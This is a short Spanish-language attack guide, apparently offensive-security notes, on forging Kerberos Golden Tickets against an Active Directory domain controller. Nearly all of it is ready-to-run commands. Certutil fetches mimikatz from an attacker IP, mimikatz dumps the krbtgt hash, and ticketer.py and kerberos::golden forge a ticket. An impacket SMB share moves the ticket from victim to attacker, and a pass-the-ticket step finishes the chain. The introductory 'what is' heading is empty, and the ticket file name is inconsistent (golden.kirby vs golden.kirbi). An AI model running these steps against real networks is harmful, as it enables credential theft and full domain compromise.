# Que es un Golden Tiket Attack?

# Efectuar Golden Ticket Attack
Para comenzar debemos subir el `mimikatz` al DC, podemos hacer por con `upload` en una sesión de evil-winrm o con:
```
certutil.exe -f -urlcache -split http://192.168.145.133:8000/mimikatz.exe mimikatz.exe
```
Posteriormente ejecutamos el mimikatz con `mimikatz.exe` y en la sesión interactiva ponemos lo siguiente:
```
lsadump::lsa /inject /name:krbtgt
```
Ahora creamos un ticket con ticketer.py ejecutando el siguiente comando:
```
ticketer.py -nthash <hash_NTLM> -domain-sid <sid_krbtgt> -domain <dominio> <nombre_exportación>
```
[Ver ejemplo](Images/users/README.md)

# Movimiento Lateral
Podemos crear un `golden.kirbi` para cargarlo con mimikatz en una máquina y ganar privilegios de acceso a un equipo, para ello en una sesión de mimikatz haremos lo siguiente:
```
kerberos::golden /domain:<dominio>  /sid:<sid_krbtgt> /rc4:<hash_NTLM> /name:<nombre de usuario a Impersonalizar> /ticket:golden.kirbi
```
Luego nos podemos traer ese ticket a nuestro equipo  con `download` en una sesión de evil-winrm o creando un recurso compartido a nivel de red con:

Máquina atacante:
```
impacket-smbserver smbFolder $(pwd) -smb2support
```
Máquina víctima:
```
copy golden.kirby \\<ip_atacante>\smbFolder\golden.kirbi
```
Ahora nos conectamos al equipo donde queremos hacer un `Pass The Ticket`, subimos el mimikatz, lo ejecutamos y en la sesión interactiva ponemos lo siguiente:
```
kerberos::ptt golden.kirby
```
